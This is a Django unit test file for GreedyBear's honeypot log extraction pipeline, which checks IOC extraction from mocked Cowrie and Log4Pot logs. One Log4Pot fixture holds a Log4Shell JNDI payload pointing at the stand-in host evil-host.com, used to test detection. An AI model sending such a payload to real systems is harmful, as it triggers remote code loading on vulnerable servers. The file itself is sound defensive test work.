from unittest.mock import MagicMock, patch

from django.test import TestCase

from greedybear.extraction.extraction_pipeline import ExtractionPipeline
from greedybear.models import IOC

class TestExtractionPipelineIntegration(TestCase):
    def setUp(self):
        self.pipeline = ExtractionPipeline()
        # Mocking external repos
        self.pipeline.elastic_repo = MagicMock()
        self.pipeline.ioc_repo = MagicMock()
        self.pipeline.sensor_repo = MagicMock()
        self.pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        self.cowrie_valid_log = [
            {
                "eventid": "cowrie.session.connect",
                "src_ip": "8.8.8.8",
                "dest_port": 22,
                "username": "root",
                "type": "cowrie",
                "session": "abc123def456",
                "timestamp": "2023-01-01T10:00:00",
                "@timestamp": "2023-01-01T10:00:00",
                "t-pot_ip_ext": "192.168.1.1"
            }
        ]
        self.empty_log = []
        self.malformed_log = [{"invalid": "data"}]
        self.cowrie_log_1 = {
            "eventid": "cowrie.session.connect",
            "src_ip": "8.8.8.8",
            "type": "cowrie",
            "session": "abc123def456",
            "timestamp": "2023-01-01T10:00:00",
            "@timestamp": "2023-01-01T10:00:00"
        }
        self.cowrie_log_2 = {
            "eventid": "cowrie.session.connect",
            "src_ip": "8.8.4.4",
            "type": "cowrie",
            "session": "def456abc123",
            "timestamp": "2023-01-01T10:00:01",
            "@timestamp": "2023-01-01T10:00:01"
        }
        self.log4pot_exploit_log = [
            {
                "type": "log4pot",
                "reason": "request",
                "src_ip": "8.8.8.8",
                "correlation_id": "corr123",
                "timestamp": "2023-01-01T12:00:00",
                "@timestamp": "2023-01-01T12:00:00"
            },
            {
                "type": "log4pot",
                "reason": "exploit",
                "src_ip": "8.8.8.8",
                "correlation_id": "corr123",
                "deobfuscated_payload": "${jndi:ldap://evil-host.com:1389/a}",
                "timestamp": "2023-01-01T12:00:01",
                "@timestamp": "2023-01-01T12:00:01"
            }
        ]

    @patch("greedybear.extraction.extraction_pipeline.UpdateScores")
    @patch("greedybear.extraction.strategies.base.IocProcessor")
    def test_extraction_pipeline_with_cowrie_log(self, mock_processor_class, mock_update_scores):
        mock_processor = mock_processor_class.return_value
        mock_record = IOC(name="8.8.8.8", type="ip")
        mock_record.save()
        mock_processor.add_ioc.return_value = mock_record

        result = self.pipeline.run(self.cowrie_valid_log)

        self.assertIsNotNone(result)
        self.assertGreater(len(result), 0)
        self.assertTrue(any(ioc.type == "ip" for ioc in result))
        mock_update_scores.return_value.score_only.assert_called()

    @patch("greedybear.extraction.extraction_pipeline.UpdateScores")
    def test_extraction_pipeline_with_empty_input(self, mock_update_scores):
        result = self.pipeline.run(self.empty_log)
        self.assertEqual(result, [])
        mock_update_scores.return_value.score_only.assert_not_called()

    @patch("greedybear.extraction.extraction_pipeline.UpdateScores")
    def test_extraction_pipeline_with_malformed_input(self, mock_update_scores):
        result = self.pipeline.run(self.malformed_log)
        self.assertIsInstance(result, list)
        self.assertEqual(len(result), 0)

    @patch("greedybear.extraction.extraction_pipeline.UpdateScores")
    @patch("greedybear.extraction.strategies.factory.ExtractionStrategyFactory.get_strategy")
    def test_pipeline_selects_cowrie_strategy(self, mock_get_strategy, mock_update_scores):
        self.pipeline.run(self.cowrie_valid_log)
        mock_get_strategy.assert_called_with("cowrie")

    @patch("greedybear.extraction.extraction_pipeline.UpdateScores")
    @patch("greedybear.extraction.strategies.base.IocProcessor")
    def test_pipeline_multiple_entries(self, mock_processor_class, mock_update_scores):
        logs = [self.cowrie_log_1, self.cowrie_log_2]
        
        mock_processor = mock_processor_class.return_value
        ioc1 = IOC(name="8.8.8.8", type="ip")
        ioc1.save()
        ioc2 = IOC(name="8.8.4.4", type="ip")
        ioc2.save()
        mock_processor.add_ioc.side_effect = [ioc1, ioc2]
        
        result = self.pipeline.run(logs)
        self.assertGreaterEqual(len(result), 2)

    @patch("greedybear.extraction.extraction_pipeline.UpdateScores")
    @patch("greedybear.extraction.strategies.base.IocProcessor")
    def test_extraction_pipeline_with_log4pot(self, mock_processor_class, mock_update_scores):
        mock_processor = mock_processor_class.return_value
        ioc = IOC(name="8.8.8.8", type="ip")
        ioc.save()
        mock_processor.add_ioc.return_value = ioc
        
        result = self.pipeline.run(self.log4pot_exploit_log)
        
        # Log4pot should have found at least the scanner and the payload hostname
        self.assertGreaterEqual(len(result), 1)
        self.assertTrue(any(call.args[0].name == "8.8.8.8" for call in mock_processor.add_ioc.call_args_list))
        self.assertTrue(any(call.args[0].name == "evil-host.com" for call in mock_processor.add_ioc.call_args_list))
